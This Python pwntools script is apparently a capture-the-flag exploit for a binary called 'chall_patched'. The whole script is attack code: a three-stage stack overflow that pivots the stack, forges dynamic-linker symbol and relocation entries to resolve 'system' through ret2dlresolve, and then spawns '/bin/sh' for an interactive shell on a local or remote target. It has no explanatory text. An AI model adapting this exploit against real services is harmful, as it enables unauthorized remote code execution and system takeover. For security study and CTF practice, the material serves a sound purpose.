#!/usr/bin/env python3

from pwn import context, p16, p32, p64, p8, remote, sys

context.binary = 'chall_patched'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


pop_rbp_ret_addr = 0x40113d
leave_ret_addr = 0x4011f2

jmp_plt_addr = 0x401039

setvbuf_got_addr = 0x404000
stderr_got_addr = 0x404040

bin_sh_addr = 0x404048

call_setvbuf_addr = 0x40119a

align = lambda alignment, addr: addr + (- addr % alignment)

JMPREL = 0x4005e0  # .rela.plt section
SYMTAB = 0x3fe450  # .symtab section
STRTAB = 0x3fe510  # .strtab section

dlresolve_payload_addr = 0x404e00
symbol_name = b'system'.ljust(8, b'\0')

fake_strtab = dlresolve_payload_addr
fake_symtab = dlresolve_payload_addr + 0x10
fake_jmprel = dlresolve_payload_addr + 0x10 + 0x18

st_name = fake_strtab - STRTAB
st_value = 0
st_size = 0
st_info = 0
st_other = 0
st_shndx = 0

elf64_sym = p32(st_name) + p8(st_value) + p8(st_size) + p16(st_info) + p64(st_other) + p64(st_shndx)

index = align(0x18, fake_strtab + len(symbol_name) - SYMTAB) // 0x18

r_offset = setvbuf_got_addr
r_info = (index << 32) | 7

elf64_rel = p64(r_offset) + p64(r_info) + p64(0)

reloc_arg = align(0x18, fake_jmprel - JMPREL) // 0x18

dlresolve_payload  = symbol_name
dlresolve_payload += b'\0' * 8
dlresolve_payload += elf64_sym
dlresolve_payload += elf64_rel

io = get_process()

stage1  = p64(pop_rbp_ret_addr)
stage1 += p64(stderr_got_addr + 0x10)
stage1 += p64(context.binary.sym.main + 28)

io.sendline(b'A' * 24 + stage1)

stage2  = p64(pop_rbp_ret_addr)
stage2 += p64(dlresolve_payload_addr - 0x80 + 0x10)
stage2 += p64(leave_ret_addr)
stage2 += b'\0' * 0xd20
stage2 += p64(dlresolve_payload_addr - 0x80 + 0x10)
stage2 += p64(context.binary.sym.main + 28)

io.sendline(p64(bin_sh_addr) + b'/bin/sh\0' + b'\0' * 8 + stage2)

stage3  = p64(jmp_plt_addr)
stage3 += p64(reloc_arg)
stage3 += p64(call_setvbuf_addr)
stage3 += b'\0' * 0x50
stage3 += dlresolve_payload

io.sendline(b'A' * 24 + stage3)

io.interactive()
